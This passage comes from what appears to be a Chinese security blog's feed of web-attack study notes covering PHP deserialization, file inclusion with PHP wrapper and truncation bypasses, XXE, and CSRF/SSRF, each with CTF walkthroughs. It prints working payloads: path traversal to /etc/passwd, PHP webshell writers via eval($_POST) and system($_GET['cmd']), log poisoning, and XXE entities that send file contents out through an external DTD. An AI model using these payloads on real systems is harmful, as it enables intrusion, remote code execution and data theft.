class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;su =<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">four</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; a= <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$d</span> -&gt; huang = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;ext=<span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$f</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行后得到如下结果</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822105327389.png" alt="image-20240822105327389"></p><p>接着读取flag，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240822105505890.png" alt="image-20240822105505890"></p><p>成功解出本题</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 反序列化 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
            <tag> PHP原生类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-文件包含漏洞、伪协议绕过</title>
      <link href="/post/fbf220f0.html"/>
      <url>/post/fbf220f0.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p><strong>包含</strong>：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用的过程被称为包含</p><p><strong>文件包含漏洞</strong>：文件包含函数的参数没有经过过滤或严格定义，并且参数可以被用户控制，这样就可能包含非预期文件。如果文件中存在恶意代码，无论是什么类型，都会被解析并执行</p><p>PHP中文件包含函数有以下四种：require()、require_once()、include()、include_once()</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">（1）require找不到被包含的文件时会产生致命错误(E<span class="emphasis">_COMPILE_</span>ERROR)，并停止脚本；</span><br><span class="line">（2）require<span class="emphasis">_once和require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span></span><br><span class="line"><span class="emphasis">（3）include找不到被包含的文件时只会产生警告(E_</span>WARNING)，脚本将继续执行。</span><br><span class="line">（4）include<span class="emphasis">_once和include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span></span><br></pre></td></tr></table></figure><h1 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h1><p>1.无限制本地文件包含漏洞</p><p>无限制本地文件包含漏洞是指代码中没有为包含文件指定特定的前缀或者.php、.html等扩展名，因此攻击者可以利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，或者执行其他文件中的代码。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/LFI.php?filename=../../../../../../../etc/passwd</span><br><span class="line">http://127.0.0.1/LFI.php?filename=test.txt</span><br></pre></td></tr></table></figure><p>2.有限制的本地文件包含漏洞</p><p>有限制的本地文件包含漏洞是指代码中为包含文件指定了特定的前缀或者扩展名，攻击者需要绕过前缀或者扩展名过滤，才能利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息。</p><p>常见的有限制本地文件包含过滤的方式主要有%00截断、路径长度截断、点号截断等等</p><p>（1）%00截断</p><ul><li>漏洞利用条件：magic_quotes_gpc=off；PHP版本低于5.3.4。</li><li>%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">payload：http:<span class="comment">//127.0.0.1/FI.php?filename=../../../../../../../etc/passwd%00</span></span><br></pre></td></tr></table></figure><p>（2）路径长度截断</p><ul><li>漏洞利用条件：Windows下目录的最大路径长度为256B；Linux下目录的最大路径长度为4096B。</li><li>操作系统存在最大路径长度限制，可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">payload：http:<span class="comment">//127.0.0.1/FI.php?filename=test.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span></span><br></pre></td></tr></table></figure><p>（3）点号截断</p><ul><li>漏洞利用条件：Windows系统</li><li>点号截断适用于Windows系统，当点号的长度大于256B时，就可造成扩展名截断</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">payload：http:<span class="comment">//127.0.0.1/FI.php?filename=test.txt....................................................................................................................................................................................................................................................................</span></span><br></pre></td></tr></table></figure><p>3.本地包含配合文件上传漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/uploadfile/<span class="keyword">echo</span>.jpg：</span><br><span class="line"><span class="meta">&lt;?</span><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">open</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[xxser]);?&gt;&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line">访问：</span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?filename=./uploadfile/echo.jpg</span></span><br><span class="line">将会在index.php所在的目录下生成shell.php。</span><br></pre></td></tr></table></figure><h1 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h1><p>远程包含功能需要确定PHP是否已经开启远程包含选项（PHP默认关闭远程包含功能），即我们要开启使得<code>allow_url_include=on,allow_url_fopen=on</code>，远程文件包含和本地文件包含没有过多的区别，我们将文件名换成远程地址即可</p><p>1.无限制远程文件包含</p><p>在正常情况下访问远程服务URL，包含在php.txt中的函数不会被执行，但是通过远程文件包含漏洞，可以将txt文件当作php文件进行执行</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?filename=http://192.168.91.133/RFI/php.txt</span><br></pre></td></tr></table></figure><p>2.有限制远程文件包含</p><p>有限制远程文件包含漏洞是指代码中存在特定的前缀或者.php、.html等扩展名，攻击者需要绕过前缀或者扩展名过滤，才能执行远程URL中的恶意代码。</p><p>通常有限制远程文件包含绕过可以通过问好、井号、空格三种方式来绕过</p><p>（1）问号绕过</p><p>可以在问号后面添加HTML字符串，问号后面的扩展名.html会被当作查询，从而绕过扩展名过滤</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?filename=http://192.168.91.133/RFI/php.txt?</span><br></pre></td></tr></table></figure><p>（2）井号绕过</p><p>可以在井号（#）后面添加HTML字符串，#号会截断后面的扩展名，从而绕过扩展名过滤，井号的URL编码为%23</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?filename=http://192.168.91.133/RFI/php.txt%23</span><br></pre></td></tr></table></figure><p>（3）空格绕过</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?filename=http://192.168.91.133/FI/php.txt%20</span><br></pre></td></tr></table></figure><p>并不是所有的绕过方式都可以，具体情况还得根据实际进行分析</p><h1 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h1><p>当可以获取session文件的路径并且session文件的内容可控时，就可以通过包含session文件进行攻击</p><p>（1）首先我们要获取session的存储位置</p><p>通过phpinfo的信息获取session的存储位置，phpinfo中的session.save_path保存的是session的存储位置</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2197110-20201204101408748-1217232225.png" alt="img"></p><p>我们还可以猜测默认的session存储位置进行尝试，通常Linux中session默认存储在<code>/var/lib/php/session</code>目录下，Windows通常保存在<code>C:\WINDOWS\Temp</code></p><p>（2）我们写入session一句话即可，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2197110-20201204153356116-1855334596.png" alt="img"></p><p>之后再利用文件包含漏洞即可利用</p><h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><p>服务器中的中间件、SSH等服务都有记录日志的功能，如果开启了记录日志功能，用户访问的日志就会存储到不同服务的相关文件中</p><p>利用步骤：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）将恶意代码写入日志文件：</span><br><span class="line">http:<span class="comment">//127.0.0.1/fi/&lt;?php @eval($_POST[123]);?&gt;</span></span><br><span class="line">或者 <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span> （防止@等特殊符号被编译）</span><br><span class="line">（<span class="number">2</span>）通过Burpsuite抓包的方式修改浏览器URL编码后的数据包，这样就可以将恶意代码写入日志文件中。</span><br><span class="line">（<span class="number">3</span>）文件包含日志文件</span><br><span class="line">http:<span class="comment">//127.0.0.1/fi/index.php?filename=../../../../../../../../../var/log/httpd/access_log</span></span><br><span class="line">通过post发送<span class="number">123</span>=<span class="title function_ invoke__">phpinfo</span>()，即可包含成功。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/6e5c1d2fde3a30aff51200633ab178e2.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/e1635ebd8b6a09722bde28520f0a5e1b.png" alt="img"></p><h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>PHP带有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exit()、file_size()等文件系统函数所提供的功能类似</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">常见的PHP伪协议如下：</span><br><span class="line">file://，访问本地文件系统。</span><br><span class="line">http://，访问http(s)网址。</span><br><span class="line">ftp://，访问ftp(s) URL。</span><br><span class="line">php://，访问各个输入输出流。</span><br><span class="line">zlib://，处理压缩流。</span><br><span class="line">data://，读取数据。</span><br><span class="line">glob://，查找匹配的文件路径模式。</span><br><span class="line">phar://，PHP归档。</span><br><span class="line">ssh2://，Secure Shell 2。</span><br><span class="line">rar://，RAR数据压缩。</span><br><span class="line">ogg://，处理音频流。</span><br><span class="line">expect://，处理交互式的流。</span><br></pre></td></tr></table></figure><p>1、php://伪协议</p><p>（1）php://filter</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">读取本地文件：</span><br><span class="line">?filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xxx.php</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php</span></span><br></pre></td></tr></table></figure><p>（2）php://input</p><p>php://input可以访问请求的原始数据的只读流，即可以直接读取POST上没有经过解析的原始数据</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> 读取POST数据：<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span> 写入木马：需要开启allow_url_include  </span><br><span class="line">     ?filename=php:<span class="comment">//input </span></span><br><span class="line">     POST数据：<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">open</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[xxser]);?&gt;&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span> 执行命令：需要开启allow_url_include  </span><br><span class="line">      ?filename=php:<span class="comment">//input </span></span><br><span class="line">      POST数据：<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2、file://伪协议</p><p>file://伪协议可以访问本地文件系统，读取文件的内容</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?filename=file:///etc/passwd</span><br></pre></td></tr></table></figure><p>3、data://伪协议</p><p>从php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行任意代码。<br><strong>利用data://时，php配置文件需要开启allow_url_include 和allow_url_fopen。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码执行：</span><br><span class="line">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p>4、phar://伪协议</p><p>phar://是用来进行解压的伪协议，phar://参数中的文件不管是什么扩展名，都会被当作压缩包。<br><strong>利用phar://时，PHP的版本应高于5.3.0，PHP配置文件需开启allow_url_include 和allow_url_fopen。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通常phar://伪协议用在有上传功能的网站中，写一个木马文件shell.php，然后用zip://伪协议压缩为shell.zip（不能用rar://伪协议压缩），再将扩展名改为.png等，上传到网站。</span><br><span class="line">?filename=phar://shell.png/shell.php</span><br><span class="line">phar://会把shell.png当作zip压缩包来解压，并且访问解压后的shell.php文件。</span><br></pre></td></tr></table></figure><p>5、zip://伪协议</p><p><strong>利用zip://时，PHP的版本应高于5.3.0，PHP配置文件需开启allow_url_include 和allow_url_fopen。</strong></p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?filename=zip://[压缩文件]#[压缩文件内的文件名]</span><br><span class="line">?filename=zip://shell.png%23shell.php</span><br><span class="line">zip://会把shell.png当作zip压缩包来接呀，并且访问解压后的shell.php文件。</span><br></pre></td></tr></table></figure><h1 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h1><p>我们以nssctf上的easy_include进行演示，我们这里可以发现，php、data伪协议不能使用，这个时候我们可以试试日志文件包含</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240817155358295.png" alt="image-20240817155358295"></p><p>我们首先查看一下中间件是什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240817155730448.png" alt="image-20240817155730448"></p><p>很明显是ngnix的中间件，我们去查看一下ngnix的日志文件保存在哪里，我们可以发现在<code>/var/log/nginx/access.log</code>下，我们尝试去访问一下，发现可以访问到日志信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240817160038435.png" alt="image-20240817160038435"></p><p>抓包，写入对应的php执行脚本</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240817160801669.png" alt="image-20240817160801669"></p><p>成功解出</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 文件包含 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本地文件包含 </tag>
            
            <tag> 远程文件包含 </tag>
            
            <tag> 伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-XML、XXE及绕过</title>
      <link href="/post/f35f0db.html"/>
      <url>/post/f35f0db.html</url>
      
        <content type="html"><![CDATA[<h1 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h1><p>XML作为一种常用于Web应用程序的数据格式。XML文档可以定义实体，它们是存储文档中其他地方重复使用的数据的方式。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p><p>XXE（XML外部实体注入）是一种针对应用程序处理XML数据的方式的攻击，在这种攻击中，攻击者利用应用程序对XML输入的处理不当，引入恶意内容，可能导致未授权的数据访问、服务拒绝攻击甚至远程代码执行。</p><p>XXE漏洞发生在应用程序解析XML输入的时候，没有禁止外部实体的加载，导致可能加载恶意外部程序，进而引发各种危害</p><h1 id="判定XML传输"><a href="#判定XML传输" class="headerlink" title="判定XML传输"></a>判定XML传输</h1><p>对于这个漏洞，最重要的是要判断是否使用了XML进行数据的传输，我们可以通过以下两个特征来进行判断，我们抓取数据提交的数据包，查看<code>Accept</code>和<code>X-Requested-With</code>，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814105724662.png" alt="image-20240814105724662"></p><p>当出现<code>application/xml</code>以及<code>XMLHttpRequest</code>的时候我们就可以判断其使用了XML进行了数据传输，这个时候我们就可以测试一下是否存在XXE漏洞</p><h1 id="XXE读取文件"><a href="#XXE读取文件" class="headerlink" title="XXE读取文件"></a>XXE读取文件</h1><p>相关payload如下所示：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">Mikasa</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814110417373.png" alt="image-20240814110417373"></p><p>我们可以成功读取到相关的文件</p><h1 id="XXE带外测试"><a href="#XXE带外测试" class="headerlink" title="XXE带外测试"></a>XXE带外测试</h1><p>当对方关闭了回显的时候，即注释掉下面的两行代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814110624139.png" alt="image-20240814110624139"></p><p>这个时候我们无论发送什么，都不会有相关的回显</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814110949750.png" alt="image-20240814110949750"></p><p>这个时候我们如何去判断有没有XXE漏洞呢？这个时候就要使用DNSlog外带技术进行带外测试，我们将地址换成dnslog的地址，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814155845194.png" alt="image-20240814155845194"></p><p>点击发送后，我们刷新dnslog的记录，看看是否刷新了相关访问记录</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814160003566.png" alt="image-20240814160003566"></p><p>出现这种情况，我们可以判断存在XXE漏洞，只是没有对应的输出信息</p><h1 id="XXE实体引用"><a href="#XXE实体引用" class="headerlink" title="XXE实体引用"></a>XXE实体引用</h1><p>带外只能判断漏洞是否存在，如果漏洞存在，那么我们该如何进行利用呢？这个时候我们就需要用到DTD文件，通过DTD文件帮助我们将对应的文件信息发送出去</p><p>我们的XML信息填写如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/www.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8081/web/php_xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd文件如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1:8081/web/get1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>我们的get1.php如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;file.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们发送后，其会调用我们外部的dtd文件，然后实现自动发送，我们使用get1.php文件进行接收对应的参数，并保存为文件</p><p>更多玩法参考这篇文章：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE - MustaphaMond - 博客园 (cnblogs.com)</a></p><h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><p>我们以nssctf上的exx为例子，这个题目一看就是要我们使用xxe漏洞进行攻击</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814163509330.png" alt="image-20240814163509330"></p><p>我们首先先随便用一个账号密码登录，然后抓包看看什么情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814163626241.png" alt="image-20240814163626241"></p><p>更加确定我们这里存在XXE漏洞了，我们这里直接读取flag试试</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>发送后我们直接读到flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814164218948.png" alt="image-20240814164218948"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> XXE攻击 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-CSRF、SSRF漏洞利用</title>
      <link href="/post/b19495c8.html"/>
      <url>/post/b19495c8.html</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF全称Cross-site request forgery，即跨站请求伪造，也被称为“One Click Attack”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，举个最基本的例子，就是别人给你发了一个奇怪的链接，你点了之后虽然什么都没有输，但是自己的QQ号被盗取了，。即该攻击可以在受害者不知情的情况下以受害者名义伪造请求，执行恶意操作，具有比较大的危害性。</p><p>CSRF攻击的两个条件：</p><ol><li>目标用户已经登录了网站，能够执行网站的功能</li><li>目标用户访问了攻击者构造的URL</li></ol><p>CSRF黑盒判断的条件：</p><ol><li>看验证来源是否一致</li><li>看凭据是否有token</li><li>看关键操作是否有进行验证</li></ol><p>原理图如下所示：</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913102058895-1443587387.png" alt="1646264151502-462246ae-7945-482e-904e-26c1aa20452a.png"></p><h2 id="后台自动添加管理员"><a href="#后台自动添加管理员" class="headerlink" title="后台自动添加管理员"></a>后台自动添加管理员</h2><p>当我们处在管理员后台界面的时候，即已登录状态</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813110518720.png" alt="image-20240813110518720"></p><p>之后点了别人发过来的url链接，<code>http://127.0.0.1:8081/web/add.html</code>，访问这个地址，我们可以发现我们的管理界面被添加了一个新的管理用户</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813110733548.png" alt="image-20240813110733548"></p><p>其实原理就是这个链接所代表的就是添加用户的数据包，当触发后，会以自己的浏览器将这个数据包发出去，然后后端就会认为是管理员进行了增加用户的操作，进而添加了这个用户，那么如何构造相关的数据包呢？这里我们要用到的就是<code>CSRFTester</code>，首先我们先在自己本地搭建一个对应的应用，然后模拟增添用户的操作，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913102058330-1015894001.png" alt="1646287809235-be0a0c46-e043-4200-8aba-1936705fff3c.png"></p><p>这个时候我们在<code>CSRFTester</code>中点击start，该工具就会抓取我的数据包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913102058167-521141857.png" alt="1646287915691-0361a3cf-6b88-4738-b990-fc4777dc39ad.png"></p><p>然后我们将这个数据包保存为forms表单，然后生成为html格式，放在网站根目录<code>http://127.0.0.1:8081/web/add.html</code>，然后在登录状态下去访问该网站，我们发现可以实现CSRF攻击</p><h2 id="CSRF防护"><a href="#CSRF防护" class="headerlink" title="CSRF防护"></a>CSRF防护</h2><ol><li>看验证来源，也就是是否符合同源策略，看数据包的<code>referer</code>的值，确保数据包是从该网站上发出去的，而不是非法数据包，但是这个方法也很好绕过，因为如果修改<code>referer</code>的值，同源策略就失效了</li><li>看凭证是否带有token值，token值用来判断是不是同一个用户，每次操作一次就会更改一次token值，而且会在操作之前对比token值，<strong>token值可以有效地防御CSRF攻击</strong></li></ol><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813140636374.png" alt="image-20240813140636374"></p><p>这就是属于token不存在的情况，说明只要是这个用户就可以了，而下面这张图就说明了token存在</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240813140917130.png" alt="image-20240813140917130"></p><ol><li>看关键操作有无验证，关键验证就好比修改密码的时候会验证你的用户名和密码</li></ol><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF全程Server-Side Request Forgery，即服务器端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统，SSRF形成的原因大部分都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，其原理图如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913102057953-1816848668.png" alt="1646264163213-66a6b56a-7e56-4f5c-962f-7e1e864bb22a.png"></p><p>SSRF可以被拿来做很多事，包括但不限于作为内网探针、读取服务器上的文件，比如我们请求地址为<code>http://127.0.0.1:3306</code>的时候，就是在探测其是否开放了数据库服务，以及可以获得数据库相关信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913102058763-248624041.png" alt="1646292590568-78fba5f1-4001-41d2-91ba-ba56b36ede77.png"></p><h2 id="内网探针"><a href="#内网探针" class="headerlink" title="内网探针"></a>内网探针</h2><p>由于内网地址的开头一般是固定的，例如<code>192.168</code>开头，所以我们可以利用bp的爆破模式对内网进行探测，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913102058919-1404511656.png" alt="1646294799804-abddedf9-1ddf-4ecc-a27e-16d9e6ea6e20.png"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913102058970-1303040167.png" alt="1646294962499-66a65a50-1553-4020-98d8-bc3e6d81c85a.png"></p><p>通过观察返回的数据包，我们可以判断其是否存在内网，以及内网IP地址是什么</p><p>接下来以CTFHUB上的题进行相关演示</p><p><img 